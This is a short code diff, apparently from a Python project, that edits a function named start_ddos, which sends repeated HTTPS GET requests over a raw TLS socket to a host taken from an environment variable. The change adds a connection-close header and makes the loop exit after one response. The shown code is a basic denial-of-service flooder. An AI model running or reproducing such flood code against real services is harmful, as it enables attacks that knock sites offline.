@@ -2586,10 +2586,13 @@ def start_ddos():
   s.connect((os.environ.get("url"), 443))
   context = ssl.create_default_context()
   s = context.wrap_socket(s, server_hostname=os.environ.get("url"))
-  message = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(os.environ.get("url"))
+  message = "GET / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n".format(os.environ.get("url"))
   while True:
     s.send(message.encode())
     data = s.recv(4096)
+    if not data:
+      break
+    return
 
 thread1 = threading.Thread(target=start_web)
 thread2 = threading.Thread(target=start_ddos)
